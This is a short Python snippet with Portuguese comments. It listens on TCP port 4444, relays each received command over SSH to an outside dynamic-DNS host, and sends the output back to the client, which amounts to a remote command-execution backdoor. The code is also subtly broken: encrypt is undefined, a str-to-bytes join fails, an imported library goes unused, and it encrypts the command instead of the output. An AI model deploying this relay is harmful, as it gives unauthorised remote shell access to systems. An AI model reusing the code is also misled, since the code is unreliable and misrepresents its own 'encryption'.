# Importa as bibliotecas necessárias
import socket
import paramiko
import cryptography

# Implementa a função run()
def run(self):
    # Cria um socket TCP
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(1)

    # Aceita uma conexão do cliente
    conn, addr = server.accept()

    # Cria um cliente SSH
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("my-no-ip-domain")

    # Executa os comandos do cliente
    while True:
        data = conn.recv(1024)
        if data == b"":
            break

        stdin, stdout, stderr = ssh.exec_command(data.decode())
        output = stdout.readlines()

        conn.sendall(b"".join(output))

        # Criptografa a saída
        data = encrypt(data, "my-secret-key")
        conn.sendall(data)

    # Fecha a conexão
    conn.close()
    
